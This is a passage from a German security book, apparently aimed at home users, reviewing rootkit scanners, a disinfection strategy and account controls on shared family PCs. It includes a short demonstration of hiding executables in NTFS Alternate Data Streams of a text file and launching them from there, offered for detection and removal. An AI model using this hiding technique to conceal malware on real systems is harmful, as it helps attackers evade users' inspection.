Leib zu r\u00fccken.\nBild 19.19: Rundum empfehlenswert: Spybot-Search & Destroy\nDie einzige Einschr\u00e4nkung des Tools besteht in seiner mangelhaften F\u00e4higkeit, KernelRootkits zu erkennen, einen Mangel, den das Werkzeug mit den allermeisten SpywareHuntern teilt. Eine schier unersch\u00f6pfliche Fundgrube von untauglichen, bisweilen auch\n264\nhttp://www.larshederer.homepage.t-online.de/erunt\n265\nhttp://www.safer-networking.org/de/index.html\n19.6 Malware-Check\n551\nverzweifelten Versuchen mit Standardwerkzeugen wie dem in der Szene hochgesch\u00e4tzten Hijackthis findet sich auf dem www.trojaner-board.de.\nBild 19.20: Wenn Spyware- und Trojan-Hunter nicht mehr weiter helfen\nAuf dieser Webseite posten dann hilflose bis genervte Heimanwender ihre ellenlangen Hijackthis-Logs, um Hilfe zu bekommen. Meistens haben sie sich einen Sch\u00e4dling eingefangen, der sich trotz aller Bem\u00fchungen mit AV-Scannern und Trojaner-J\u00e4gern einfach nicht entfernen l\u00e4sst. Meist registrieren die solcherart geplagten User nicht, dass sich die oft leichtsinnigerweise eingefangene Malware beim besten Willen (und auch prinzipiell nicht) von diesen Tools beseitigen l\u00e4sst. Was man hier braucht, sind sehr spezielle Werkzeuge \u2013 Rootkit-Scanner, die h\u00e4ufig nur einen einzigen Zweck haben, n\u00e4mlich Tarnkappensch\u00e4dlinge zu enttarnen und zu vernichten. Mittlerweile gibt es mehr als zwei Dutzend Tools, die um die Gunst der Anwender buhlen. Die Lieferanten sind meist Anbieter von klassischen Virenscannern, \u00f6fter auch mal Black Hats und White Hats, also die \u00bbb\u00f6sen\u00ab wie die \u00bbguten\u00ab Hacker. \u00c4ltere Virenscanner von McAfee, Kaspersky, G-DATA und anderen arbeiteten in der Regel haupts\u00e4chlich signaturbasiert, d. h., sie scannen Arbeitsspeicher und Dateisystem auf das Vorhandensein malwaretypischer Patterns. Prinzipbedingt haben sie folgende Einschr\u00e4nkung: Sie m\u00fcssen st\u00e4ndig aktualisiert werden, da laufend neue Virenst\u00e4mme auftauchen, die auch von der Heuristik der Virenscanner nicht erkannt werden. Selbstverst\u00e4ndlich erkennen Virenscanner auch Rootkits, sofern sie noch nicht installiert sind, anhand ihrer Signatur. Sobald sich Rootkits im System verankert haben, zielen manche Virenscanner aber ins Leere, da ein aktives Rootkit seine Spuren vor dem Scannerzugriff versteckt. Antirootkits arbeiten meist auf einer anderen Basis: sie scannen keine Muster, sondern untersuchen, ob das Betriebssystem (Arbeitsspeicher, Systemdateien, Registry etc.) charakteristische Modifikationen aufweist, z. B. Hooks an wichtigen Systemtabellen.\n552\nKapitel 19 \u2013 Private Networking\nBild 19.21: AntiVir Personal \u2013 Rootkitsuche inklusive\nAntirootkits suchen also nicht nach Signaturen oder Bitmustern, sondern nach Verhaltensauff\u00e4lligkeiten im System. Um diese Aufgabe leisten zu k\u00f6nnen, brauchen sie \u2013 wie die Rootkits selbst \u2013 die vollst\u00e4ndige Systemkontrolle. Mit anderen Worten: Sie operieren wie ihre Gegner, die Rootkits, auf unterster Systemebene. Obwohl selbst f\u00fcr den Privatgebrauch kostenlose Scanner wie AntiVir Antirootkit-Funktionen integriert haben, sollte man dennoch nicht auf einen oder zwei leistungsf\u00e4hige externe RootkitJ\u00e4ger verzichten. F\u00fcr tiefer gehende Systemrecherchen bieten diese Tools allerdings zu wenig M\u00f6glichkeiten, was sich nachteilig auswirkt bei der Suche nach neuen oder experimentellen Rootkits. Einen sehr guten Einstieg, wie geschickt Rootkits ihre Existenz selbst vor den erfahrenen Augen eines Netzwerk-Admins verbergen k\u00f6nnen, bietet Reverend Bill Blunden (The Rootkit Arsenal. Escape and Evasion in the Dark Corners of the System, 2009, Wordware Publishing, Inc.). Laut Blunden braucht der ambitionierte RootkitJ\u00e4ger nicht nur bessere Alternativen als die einfachen Click- & Shoot-Tools; er braucht ebenso (neben der daf\u00fcr n\u00f6tigen Zeit) detektivischen Sp\u00fcrsinn und Killerinstinkt. Tools, die diesen Zweck unterst\u00fctzen, verf\u00fcgen zum Teil \u00fcber sehr leistungsf\u00e4hige, auf KernelEbene arbeitende Killerfunktionen, das hei\u00dft, sie l\u00f6schen ohne Neustart versteckte Registry- und Dateieintr\u00e4ge, machen Hooks r\u00fcckg\u00e4ngig und l\u00f6schen getarnte Prozesse.\n553\n19.6 Malware-Check\nAnti-Rootkits Name\nXP\nVista Win 7\nAnbieter\nFunktionsumfang\nLeistungsf\u00e4higkeit\nDeep System Explorer\nx\nx\nwww.diamondcs.com.au (ab 27.95 $)\nDemo\nGMER\nx\nx\nwww.gmer.net\n-\nHelios Lite\nx\nx\nhttp://helios.miel-labs.com\n-\nIcesword\nx\n-\nwww.xfocus.org\n-\nRadix\nX\n-\nwww.usec.at\n-\nRootkit Unhooker\nX\n(x)\nwww.rkunhooker.narod.ru\n-\nSeem\nx\n-\nhttp://seem.about.free.fr\n-\nThe Stubware\nx\nx\nwww.thestubware.com\n-\nDerartige Werkzeuge erfordern aber ein sehr hohes Systemverst\u00e4ndnis. Da sie neben tats\u00e4chlichen Sch\u00e4dlingen auch normale Hooks (z. B. von anderen Securityprodukten oder Virtualisierungssoftware) anzeigen, kann eine unbedachte Aktion schnell den Crash des gesamten Systems nach sich ziehen. F\u00fcr Anf\u00e4nger g\u00e4nzlich ungeeignet sind Tools, die wie der System Virginity Verifier der polnischen Sicherheitsexpertin Joanna Rutkowska auf Kommandoebene operieren und \u00fcber kein grafisches Interface (GUI) verf\u00fcgen. Leider \u00bbgl\u00e4nzt\u00ab der SVV auch mit vielen \u00bbfalse positives\u00ab, wobei das VanquisRootkit nicht entdeckt wird, ein Schicksal, das SVV mit anderen Rootkit-Scannern teilt. Uneingeschr\u00e4nkt empfehlenswert sind dagegen folgende Rootkit-J\u00e4ger: \u2022\nGMER verf\u00fcgt \u00fcber ein sehr umfangreiches Arsenal an Detektoren: Durch Rootkits getarnte Dateien (auch in Alternate Data Streams), Module, Prozesse, Services und Threads werden zielsicher aufgedeckt; Hooks an Systemtabellen (System Service Descriptor Table, Interrupt Descriptor Table) sowie versteckte IRP Calls (I/O Request Packets) k\u00f6nnen ebenfalls angezeigt werden. Als Unterst\u00fctzung f\u00fcr weniger ge\u00fcbte RootkitAnalytiker gibt GMER auch eine gezielte Hilfestellung: Verd\u00e4chtige Objekte werden rot dargestellt, zus\u00e4tzlich erfolgt ein entsprechender Warnhinweis.\n554\nKapitel 19 \u2013 Private Networking\nBild 19.22: Der Rootkit-Scanner GMER kann Hooks teilweise auch wieder zur\u00fccksetzen\n\u2022\nDeep System Explorer Stellt derzeit eines der leistungsf\u00e4higsten, aber auch komplexesten Tools zum Aufsp\u00fcren getarnter Malware dar.\nBild 19.23: Ohne Expertenwissen nutzlos: DSE\n19.6 Malware-Check\n555\nLeider wird man auf den ersten Blick von der F\u00fclle der System-Essentials fast erschlagen. Die Analysen sind auf f\u00fcnf Bl\u00f6cke verteilt: General \u2013 Event \u2013 Debug \u2013 Hidden \u2013 System \u2013 Network. Auf der anderen Seite kann man sein System auch gezielt nach verd\u00e4chtigen Systemaktivit\u00e4ten absuchen:\nBild 19.24: Auf den Suche nach Sicherheitsverletzungen\n\u2022\nICESWORD von der chinesischen Security Group X-Focus war eines der ersten Werkzeuge, mit denen man effektiv gegen Rootkits vorgehen konnte. In der aktuellen Version 1.20 sind die wesentlichen Men\u00fcpunkte in Englisch aufgelistet. \u00c4hnlich wie bei den\n556\nKapitel 19 \u2013 Private Networking\nbeiden oben genannten Tools werden auch hier versteckte Prozesse, Threads, Module, Ports sowie Hooks und sonstige Manipulationen an Systemtabellen dargestellt (kritische Eintr\u00e4ge in Rot). Besonders hervorzuheben sind die umfangreichen L\u00f6schm\u00f6glichkeiten f\u00fcr Rootkit-getarnte Treiber, Dateien und Registryeintr\u00e4ge. Da IceSword selbst auf Kernelebene operiert, werden Rootkits auch ohne Neustart r\u00fcckstandsfrei in wenigen Sekunden beseitigt. Gut gef\u00e4llt hier die Monitoringfunktion, die das System ab Neustart auf m\u00f6gliche Infektionsherde \u00fcberwacht und auch solche Malware findet, die sich nach der Infektion vorzeitig selbst beendet, um einer fr\u00fchen Entdeckung zu entgehen.\nBild 19.25: Das Vista-taugliche IceSword \u00fcberzeugt mit guter Funktionalit\u00e4t\nEine lobende Erw\u00e4hnung verdient noch das russische Hackerwerkzeug Rootkit Unhooker. Es ist nur ca. 100 KB gro\u00df, findet versteckte Treiber, Prozesse und Kernelhooks. Au\u00dferdem ist es das einzige Werkzeug von allen hier getesteten, das das RK Demo-Rootkit (aus der gleichen russischen Schmiede) entdecken kann. Leider wird es vom Echtzeitschutz des AVAST-Antivirusprogramms geblockt. Eine Waffe fehlt noch im Arsenal des Kammerj\u00e4gers: ein Tool, um Sch\u00e4dlinge aufzusp\u00fcren, die sich in Alternate Data Streams (ADS) verbergen. ADS ist eine Errungenschaft des von Microsoft eingef\u00fchrten Dateisystems NTFS und gestattet es, neben dem Hauptdatenstrom noch Nebenstr\u00f6me abzuspeichern. Dabei ist der beherbergenden Datei mit Bordmitteln nicht anzusehen, welche G\u00e4ste sie im Handgep\u00e4ck mit sich f\u00fchrt.\n19.6 Malware-Check\n557\nBild 19.26: Russisches Antirootkit gegen Kernelhooks\nBild 19.27: Prinzipdarstellung von ADS\nDas Beispiel l\u00e4sst sich relativ einfach nachvollziehen. In der Eingabeaufforderung von Windows tippen wir Folgendes ein:\n558\nKapitel 19 \u2013 Private Networking\nBild 19.28: Impfen der test.txt mit zwei Programmen\nF\u00fcr den Dateiexplorer sowie jeden Editor wirkt die Datei test.txt sehr harmlos; sie ist 1 KB gro\u00df und enth\u00e4lt lediglich die Zeile: \u00bbDies ist ein ADS-Test\u00ab. In Wirklichkeit beherbergt sie zwei alternative (zus\u00e4tzliche) Datenstr\u00f6me: calc.exe und notepad.exe. Statt dieser harmlosen Dateien k\u00f6nnten sich auch weniger harmlose G\u00e4ste hinter der Textdatei verbergen. Mit dem Kommando C:\\start test.txt:notepad.exe kann man jetzt den ADS aktivieren. Es gibt einige Tools, die ADS anzeigen, z. B. den kostenlos erh\u00e4ltlichen Stream Explorer266.\nBild 19.29: ADS entdecken mit dem Stream Explorer\n266\nhttp://www.rekenwonder.com/streamexplorer.htm\n19.6 Malware-Check\n559\nSehr viel schwieriger ist es, die ungebetenen G\u00e4ste wieder loszuwerden. Hat man in seinem System noch eine FAT16- oder FAT32-Partition, geht es relativ einfach \u00fcber Umkopieren, da FAT-Partitionen keine Alternate Data Streams speichern k\u00f6nnen. Kopiert man also \u2013 mit einem beliebigen Werkzeug \u2013 test.txt auf eine andere Partition und von dort wieder zur\u00fcck auf die NTFS-Partition, sind die Datennebenstr\u00f6me weg. Der andere Weg ist umst\u00e4ndlicher: C:\\type test.txt > test.tx.bak C:\\del test.txt C:\\rename test.txt.bak test.txt Die letzte M\u00f6glichkeit267 f\u00fchrt \u00fcber NTFSext.exe, ein Microsoft-Tool, das Sie kostenlos vom MSDN268 herunterladen k\u00f6nnen. Es enth\u00e4lt u. a. ein VBS-Skript namens Rwstream.vbs, mit dem man \u2013 Quelldatei + ADS-Namen als bekannt vorausgesetzt \u2013 den ADS einfach \u00fcberschreiben und damit unwirksam machen kann.\nBild 19.30: ADS unwirksam machen\nNoch einfacher ist es, die enthaltene StrmExt.dll in das Verzeichnis Windows\\System32 zu kopieren und dann mit Start / Ausf\u00fchren / regsvr32 StrmExt.dll zu registrieren. Anschlie\u00dfend hat man im Dateiexplorer unter Eigenschaften eine neue Option: Stream.\n267\nausf\u00fchrlich nachzulesen unter: http://www.heysoft.de/nt/dntfs-ads.htm\n268\nhttp://msdn.microsoft.com/en-us/library/ms810604.aspx\n560\nKapitel 19 \u2013 Private Networking\nBild 19.31: ADS anzeigen und ver\u00e4ndern\nIm Prinzip haben wir jetzt alle Werkzeuge f\u00fcr den Malware-Check und die sich gegebenenfalls anschlie\u00dfende Grundreinigung zusammen. Als Suchstrategien kommen in Betracht: \u2022\nStarten im abgesicherten Modus + Scan\n\u2022\nScan vom (m\u00f6glichweise infizierten) System direkt\n\u2022\nScan von au\u00dfen via Network oder andere Bootpartition\nHier noch ein paar Tipps: Da beim Besuch von Webseiten gew\u00f6hnlich Spuren wie Tracker-Cookies und meist harmlose Varianten von Adware zur\u00fcckbleiben, kann man diese vorab beseitigen, z. B. mit dem kostenlosen CCleaner269. Man gewinnt durch diese Vorabreinigung mehr \u00dcbersicht beim eigentlichen Malware-Scan. Der zweite Tipp gilt der Systemwiederherstellung. Wurde bereits eine Systemdatei mit einem Virus, Wurm oder Trojaner verseucht, kann es sein, dass Windows die infizierte Datei m\u00f6glicherweise in die Sicherung mit einbezogen hat. Wird nun der Rechner von der infizierten Datei ges\u00e4ubert, restauriert die Systemwiederherstellung die im Backup vorhandene (und infizierte) Datei zur\u00fcck in das Systemverzeichnis. Um diese Mechanismen vor\u00fcbergehend au\u00dfer Kraft zu setzen, m\u00fcssen Sie die Systemherstellung \u00fcber Start / Systemsteuerung / System / Systemwiederherstellung vor dem Scannen deaktivieren und nach der Reinigungsprozedur wieder aktivieren. 269\nhttp://www.ccleaner.com\n19.6 Malware-Check\n561\nBild 19.32: Vor dem AV-Scan die Systemwiederherstellung deaktivieren\nDer Malware-Scan im abgesicherten Modus (nach dem Neustart die (F8)-Taste dr\u00fccken) hat Vor- und Nachteile. Da Malware sich oft \u00fcber Treiber ins Betriebssystem einklinkt, diese aber beim abgesicherten Start nur in der Minimalkonfiguration starten, kann man Malware prinzipiell leichter enttarnen und auch l\u00f6schen. Nachteil: Unbekannte bzw. brandneue Rootkits sind zwar nicht aktiv, k\u00f6nnen aber anhand ihrer unbekannten Signatur nicht vom AV-Scanner erfasst werden und schl\u00fcpfen durch die Maschen, d. h., sie sind beim n\u00e4chsten Start wieder aktiv. Au\u00dferdem gibt es Malware, die diese Startvariante blockiert oder trotzdem aktiv ist. \u00dcberdies starten nicht alle Kammerj\u00e4ger im abgesicherten Modus. Mit anderen Worten: Wir sind keine gro\u00dfen Fans dieser Methode. Wir bevorzugen die Arbeit am lebenden Objekt, zumal hier Rootkits anhand ihrer Verhaltensweise besser entdeckt werden k\u00f6nnen. Das ist auch der Grund, warum wir externe Scans \u00fcber eine zweite Bootplatte, Boot-CD oder \u00fcbers Netzwerk nur f\u00fcr die zweitbeste L\u00f6sung halten, wobei der Scan \u00fcbers Netzwerk, insbesondere die Suche nach offenen Ports, nat\u00fcrlich wieder einiges wettmacht. Am besten, man kombiniert beide Methoden.\n562\nKapitel 19 \u2013 Private Networking\nBild 19.33: Desinfektionsstrategie270\nBei jeder Desinfektionsma\u00dfnahme kommt nach dem ersten Check der Punkt, an dem man sich fragt, ob das System noch zu retten ist oder ob man es nicht besser gleich neu aufsetzt. Obwohl es in den Securityforen Tradition hat, dass selbsternannte Experten schon bei Bagetellinfekten zum \u00bbPlattmachen\u00ab raten (weil ihnen nichts anderes einf\u00e4llt), halten wir eine differenzierte Betrachtung f\u00fcr vorteilhafter \u2013 gerade weil es oft viele Tage dauert, bis nach einer Neuinstallation der Originalzustand wieder hergestellt ist. Die folgende Tabelle kann Ihnen die Entscheidungsfindung erleichtern:\n270\nsehr viel ausf\u00fchrlicher beschrieben im Anti Hackerz Book 2007, S. 151 \u2013 176\n19.6 Malware-Check\n563\nKompromittierungsgrad\nSch\u00e4dlingsbefall: Symptome/Sch\u00e4den\nErgebnis der Systemreinigung (nach Phase 1)\nEmpfohlene Aktion\nLeicht\nBefall durch Ad- & Spyware, Search Toolbars etc.; inaktive, noch nicht installierte Malware; kein Befall von Systemdateien, Firewall & Virenscanner funktionst\u00fcchtig\nNach dem Systemneustart werden keine Rootkits und keine sonstige Malware mehr angezeigt (Check durch Rootkitentferner + 2 Virenscanner), keine Auff\u00e4lligkeiten, Firewall meldet keine Internetverbindungsaufnahmen durch unbekannte Programme\nSystem ist mit hoher Wahrscheinlichkeit malwarefrei und kann normal weiterbenutzt werden\nMittel\nMehrfachbefall durch Trojaner (Keylogger), W\u00fcrmer & Viren (aber keine Fernsteuerungstools bzw. RATs & Rootkits); Firewall & Virenscanner scheinen funktionst\u00fcchtig; Systemdateien k\u00f6nnten modifiziert bzw. durch Malware-Komponenten ersetzt worden sein\nNach dem Systemneustart werden keine Rootkits und keine sonstige Malware mehr angezeigt (Check durch Rootkitentferner + 2 Virenscanner), keine Auff\u00e4lligkeiten, Firewall meldet keine Internetverbindungsaufnahmen durch unbekannte Programme\nPers\u00f6nliche Daten wurden weitergegeben; alle Passw\u00f6rter bzw. Login-Daten m\u00fcssen ge\u00e4ndert werden; falls finanzielle Sch\u00e4den drohen(eBay, Banken etc.) die Polizei informieren, Beweissicherung; System kann mit gewisser Wahrscheinlichkeit weiterbenutzt werden; weitere \u00dcberpr\u00fcfung sinnvoll\nSchwer\nNeben klassischer Malware sind Rootkits und/oder RATs installiert worden; wichtige Systemdateien wurden manipuliert, Firewall und Virenscanner teilweise au\u00dfer Kraft gesetzt\nNach der Systemreinigung verh\u00e4lt sich das System immer noch auff\u00e4llig bzw. die Funktionalit\u00e4t von Windows-Komponenten und/oder Securityprogrammen ist beeintr\u00e4chtigt\n(s.o); Rettungsversuch nur im Ausnahmefall sinnvoll; gute Systemkenntnisse erforderlich, neueste Antirootkits, Netzwerkscanner etc. m\u00fcssen eingesetzt werden. Ansonsten gilt: System neu aufsetzen\nPhase 2 ist ein iterativer Prozess; insbesondere sollte hier Wert darauf gelegt werden, die Rootkits zu erwischen. Detailarbeit ist dann angesagt, wenn nach diversen Desinfektionsprozeduren immer noch Prozesse verlangsamt bzw. Systemfunktionalit\u00e4ten beeintr\u00e4chtigt sind oder die Firewall immer wieder meldet, dass omin\u00f6se Programme nach Hause telefonieren wollen. Die effizienteste Bek\u00e4mpfungsstrategie orientiert sich immer an den b\u00f6sartigsten und heimt\u00fcckischsten Sch\u00e4dlingen. Es macht \u00fcberhaupt keinen Sinn, allein mit klassischen Virenscannern Jagd auf diese Sch\u00e4dlinge zu machen. Noch fruchtloser ist das Unterfan-\n564\nKapitel 19 \u2013 Private Networking\ngen, mit Tools wie Hijackthis oder den diversen Trojanerj\u00e4gern etwas gegen hartn\u00e4ckige Sch\u00e4dlinge zu unternehmen. Wurde das System mit RATs und Rootkits verseucht und in einen Zombie verwandelt, ist guter Rat teuer. Bei finanziellen Sch\u00e4den (Aussp\u00e4hen von Pin/Tan-Kombinationen oder einem gehackten eBay-Account) muss schnell gehandelt und die Staatsanwaltschaft eingeschaltet werden. Vor diesem Hintergrund ist das Desinfizieren des Rechners sogar ausgesprochen kontraproduktiv. Zwecks Beweissicherung l\u00e4sst man den Rechner ausgeschaltet oder macht via Boot-CD eine Imagekopie des infizierten Rechners. Wenn ein Rettungsversuch gelingt und die Zwischenergebnisse vielversprechend aussehen, sollte noch ein Abschlusscheck durchgef\u00fchrt werden. In der dritten und letzten Phase kann das System jetzt von au\u00dfen \u00fcberpr\u00fcft werden. Aussichtsreich, wenngleich aufwendig ist der Dateivergleich mit dem Windows-Tool Windiff.exe, das wir bereits im Kapitel \u00fcber die Abwehr von Keyloggern & Co. beschrieben haben. Es basiert auf dem Abgleich zweier Dateilisten: Die erste Liste wird auf dem verd\u00e4chtigen System selbst erstellt, z. B. werden die Dateien im Windows-Verzeichnis aufgelistet. Die zweite Liste hat dasselbe Pr\u00fcfobjekt, aber dieses Mal wird sie \u00fcber ein externes Bootmedium erstellt. Grunds\u00e4tzlich sollte es keine Abweichung geben: Im \u00fcberpr\u00fcften Verzeichnis sollten dieselben Dateien mit identischen Attributen (Gr\u00f6\u00dfe, Datum etc.) vorhanden sein. Gibt es dennoch Unterschiede, kann daraus auf die Existenz eines Rootkits geschlossen werden, das die in der Liste 2 korrekt angezeigten (Malware-)Dateien diskret aus der Anzeige ausgefiltert hat.\n19.7\nRisiko: Mehrbenutzer-PCs und Netzwerksharing\nWas es damit auf sich hat, davon wei\u00df dieser Anwender ein tragikomisches Liedchen zu singen:\nBild 19.34: Wenn mehrere User sich einen PC teilen\nHier spricht ein leidgepr\u00fcfter Sohn \u2013 mal etwas anderes als die vielen leidgepr\u00fcften Eltern, deren Z\u00f6glinge den Arbeits-PC mit Viren, W\u00fcrmern und Spyware vollm\u00fcllen.\n19.7 Risiko: Mehrbenutzer-PCs und Netzwerksharing\n565\nUnabh\u00e4ngig von der Eltern-Kind-Problematik geht es schlicht darum, minimale Sicherheitsstandards einzuhalten, wenn sich mehrere Personen den PC und den Internetzugang teilen. Ansonsten kann es relativ unerfreuliche \u00dcberraschungen geben, wovon das Herunterladen von Pornos noch das geringste \u00dcbel ist. Betrachten wir folgenden Fall: Es geht um ein kleines Netzwerk mit zwei PCs, einem tempor\u00e4r angeschlossenen Notebook und einem Internetrouter. Der vierzehnj\u00e4hrige Sohn interessiert sich f\u00fcr Spiele, l\u00e4dt aber auch gerne Songs aus dem Internet. Von Unrechtsbewusstsein (digital honesty) nat\u00fcrlich keine Spur; die Mutter chattet gern und l\u00e4dt sich haupts\u00e4chlich Rezepte aus dem Internet. Der Vater hat das Netzwerk eingerichtet und legt Wert darauf, dass jedes Familienmitglied gleichberechtigt Zugang zum Netz und seinen Ressourcen hat. Da er beruflich viel mit PC und Notebook arbeitet, nutzt er Letzteres zu Hause auch mal f\u00fcr berufliche Dinge. Um es kurz zu machen: Die Ehefrau hat sich auf einer dubiosen Webseite (\u00bbdort gab es so tolle Rezeptb\u00fccher zum Download\u00ab) einen Trojaner an Land gezogen, der sich auch im heimischen Netz breitgemacht hat. Dem Sohn steht eine Anzeige ins Haus wegen des Verbreitens urheberrechtlich gesch\u00fctzten Materials, und der Vater hat nicht nur der Polizei gegen\u00fcber einiges zu erkl\u00e4ren, sondern auch dem IT-Verantwortlichen seines Arbeitgebers. Was ist falsch gelaufen, und wie kann man sich und die \u00fcbrigen Netzwerkteilnehmer besser sch\u00fctzen? Das simpelste und dazu noch kostenlose Werkzeug ist die Verwaltung der Benutzerkonten unter Windows XP. Auf jedem PC werden zwei Konten eingerichtet: ein AdminKonto und ein Konto mit beschr\u00e4nkten Rechten, was \u00fcber Start / Systemsteuerung / Benutzerkonten einfach zu bewerkstelligen ist.\nBild 19.35: Benutzerkontenverwaltung\nF\u00fcr jedes Konto werden jetzt Kennw\u00f6rter gesetzt (mindestens acht Zeichen und kein Wort, das im Lexikon steht), wobei jeweils ein Konto auf einem Rechner mit dem Kontotyp eingeschr\u00e4nkt einzurichten ist. In der Beschreibung steht ziemlich genau, was ein solcherma\u00dfen eingeschr\u00e4nkter User alles darf:\n566\nKapitel 19 \u2013 Private Networking\nBild 19.36: Was ein eingeschr\u00e4nkter User alles darf\nKurz gesagt: Er darf relativ wenig \u2013 und das ist aus Sicherheitsgr\u00fcnden auch gut so. Denn das, was ein Benutzer darf, darf auch das Programm, das er installiert. Unter einem eingeschr\u00e4nkten Benutzerkonto kann man ungest\u00f6rt surfen, da dem Anwender und auch potenziellen Sch\u00e4dlingen jede M\u00f6glichkeit genommen ist, ein Programm zu installieren, das gravierende Systemver\u00e4nderungen bewerkstelligt. Ein User kann bei diesen Einstellungen fast ungest\u00f6rt arbeiten. Nur dort, wo der Anwender am System etwas ver\u00e4ndern m\u00f6chte, wird er ausgebremst.\nBild 19.37: Antirootkit-Programme k\u00f6nnen nicht gestartet werden\nDazu geh\u00f6ren neben den eigentlichen Rootkits bedauerlicherweise auch ihre Gegenspieler. An der Systemkonfiguration kann man auch wenig schrauben, sonst beschwert sich das Betriebssystem \u00fcber die nicht vorhandenen Administratorrechte.\nBild 19.38: Keine Systemver\u00e4nderungen ohne Admin-Rechte\nAllein an dieser simplen Ma\u00dfnahme scheitern schon viele User und melden in den Foren, dass sie jetzt nicht mehr ins Internet kommen. F\u00fcr diese F\u00e4lle gibt es mit dem XP-UserManager ein Tool, das die Benutzerverwaltung noch st\u00e4rker simplifiziert.\n19.7 Risiko: Mehrbenutzer-PCs und Netzwerksharing\n567\nBild 19.39: Benutzerverwaltung leichtgemacht\nDas vor zwei Jahren von uns konterkarierte \u00bbsicherste und beste Windows aller Zeiten\u00ab \u2013 Vista \u2013 ist heute Schnee von gestern (nachdem viele Businesskunden diese Version einfach ausgelassen haben). Heute dominiert das von vielen Experten f\u00fcr besser befundene Windows 7 den Markt. Zu seinen Sicherheitsfeatures geh\u00f6rt auch die von Vista her bekannte User Account Control271 (UAC) \u2013 eine Art Sandbox-Konzept, das selbst Usern, die sich als Administrator anmelden, nicht automatisch h\u00f6here Rechte (etwa f\u00fcr Systemmodifikationen) zugesteht, sondern explizit deren Zustimmung fordert. In der Praxis darf das Konzept im Vergleich zu Windows XP als echter Sicherheitsgewinn bezeichnet werden, zumal es Microsoft im Vergleich zum Vorg\u00e4nger Vista auch etwas entsch\u00e4rft hat. Nur in der Position \u00bbImmer benachrichtigen\u00ab erweist es sich als echter Sicherheitsgewinn \u2013 und als absolute Spa\u00dfbremse.\n271\nausf\u00fchrliche, gut beschriebene Darstellung unter: www.microsoft.com/germany/technet/prodtechnol/ windowsvista/secprot/uacppr.mspx\n568\nKapitel 19 \u2013 Private Networking\nBild 19.40: Benutzersteuerung unter Win 7 entsch\u00e4rft\nTrotz allem scheint uns das ein Schritt in die richtige Richtung: Konzentration auf Standardanwendungen mit Standardrechten, Spezialrechte nur dort, wo sie tats\u00e4chlich gebraucht werden. Damit ist der Grundstock f\u00fcr ein sicheres Surfen erst einmal gelegt. Die nachfolgend aufgef\u00fchrte Checkliste stellt in \u00fcbersichtlicher Form noch einmal alle flankierenden Sicherheitsma\u00dfnahmen dar, die wir in den vorangegangenen Kapiteln behandelt haben. Nr. Ma\u00dfnahme 1 2 3 4 5 6 7 8\nAktuellen Sicherheitsstatus ermittelt / Patches & Updates eingespielt? Firewall auf jedem Rechner eingerichtet? Mehr als ein Virenscanner (einer davon mit Online-W\u00e4chter) auf jedem Rechner installiert? Automatische Updates f\u00fcr AV-Scanner und Firewall aktiviert? Eventuell gesetzte Standardpassw\u00f6rter von (WLAN)-Router und sonstigen Netzwerkkomponenten erneuert bzw. durch sichere Passw\u00f6rter ersetzt? Falls vorhanden: WLAN auf neuesten Sicherheitsstand gebracht (WPA 2) und f\u00fcr alle Netzteilnehmer konfiguriert? Alle Netzwerkteilnehmer \u00fcber Netzwerkrisiken ausf\u00fchrlich aufgekl\u00e4rt? Regelm\u00e4\u00dfige \u00dcberpr\u00fcfung und Systemreinigung durchgef\u00fchrt / organisiert?\nja nein\n19.7 Risiko: Mehrbenutzer-PCs und Netzwerksharing\nNr. Ma\u00dfnahme 9 10 11\n569\nja nein\nDie angeschlossenen Rechner auf weniger sicherheitskritische Produkte (Firefox, Opera, Thunderbird etc.) umgestellt? Regelm\u00e4\u00dfige System- und Datenbackups organisiert? Zus\u00e4tzliche Sicherheitsprogramme (KeyScramber, ProcessGuard, Zugangskontrolle, Verschl\u00fcsselungssoftware etc.) installiert?\nEin besonders wichtiger Punkt, gerade auch im Hinblick auf weniger versierte und gef\u00e4hrdete Netzwerkteilnehmer (z. B. Kinder und Jugendliche), ist das Thema \u00bbAufkl\u00e4rung\u00ab. Dass Millionen von PCs weltweit verseucht, als Spam-Schleudern missbraucht und beliebig ferngesteuert (Bot-Netze) werden, ist sicherlich kein Zufall, sondern zeigt, dass die technischen M\u00f6glichkeiten, das technisch Machbare dem Wissen um die Gefahren von WWW & Co. l\u00e4ngst schon den Rang abgelaufen haben. Ansonsten kann man nat\u00fcrlich auch schwerere Gesch\u00fctze auffahren. Wir meinen damit nicht das \u00dcberwachen und Ausspionieren der anderen Netzwerkteilnehmer, sondern das gezielte Einschr\u00e4nken von M\u00f6glichkeiten. Ein gutes Beispiel daf\u00fcr bietet die Kindersicherung 2010 von www.salfeld.de.\nBild 19.41: Nutzung von PCs reglementieren\nL\u00e4sst man die moralisch-p\u00e4dagogischen Aspekte einmal au\u00dfer Acht, dann kann man, einige Stunden Arbeit am PC und ausreichende PC-Kenntnisse zwingend vorausgesetzt, einen PC kind- und jugendgerecht einrichten. In der Presse wurde das Programm auch schon als Computer-Nanny bezeichnet.\n570\nKapitel 19 \u2013 Private Networking\nDer Einsatz, der die gesamte Windows-Palette (Windows 95 bis Vista / Windows 7) einbezieht, zielt vorzugsweise auf drei Bereiche: \u2022\nZeitkontingente f\u00fcr die PC-Nutzung bereitstellen und \u00fcberwachen Generell l\u00e4sst sich die Nutzungszeit je PC-User reglementieren; zus\u00e4tzlich k\u00f6nnen Zeitfenster f\u00fcr bestimmte Programme aber auch f\u00fcr bestimmte Internetseiten (Onlinespiele) definiert und \u00fcberwacht werden.\n\u2022\nInhaltliche Nutzersteuerung Unerw\u00fcnschte Inhalte aus dem Internet (Porno, Warez etc.) k\u00f6nnen geblockt, unerw\u00fcnschte Programme vom Start ausgeschlossen werden.\n\u2022\nSystemschutz Unerw\u00fcnschte Systemver\u00e4nderungen (Registry, Stammverzeichnis von Windows etc.) k\u00f6nnen unterbunden, der Zugriff auf bestimmte Dateien und Verzeichnisse gesperrt werden.\nDas Produkt arbeitet transparent und vor allem effektiv. Es ist nur mit M\u00fchen auszutricksen, fundierte Systemkenntnisse sind n\u00f6tig. Die Firma Salfeld wird sich sicherlich freuen, wenn es in den Foren der leidgepr\u00fcften Kunden hei\u00dft:\nBild 19.42: Kundenfeedback der Kindersicherung\nEinen Experten h\u00e4lt die Kindersicherung allerdings nicht lange auf. J\u00f6rg Klemenz betreibt eine recht informative Bloggerseite zu Rootkits und anderen Sicherheitsthemen. Er hat die Kindersicherung bereits 2006 unter die Lupe genommen272 und h\u00e4lt sie auf seine unnachahmliche Art f\u00fcr ein Marshmallow. Die S\u00fcffisanz und die ironisch-arrogante Art des Bloggers mal rausgerechnet \u2013 das Produkt selbst hat diverse Sicherheitsl\u00fccken, 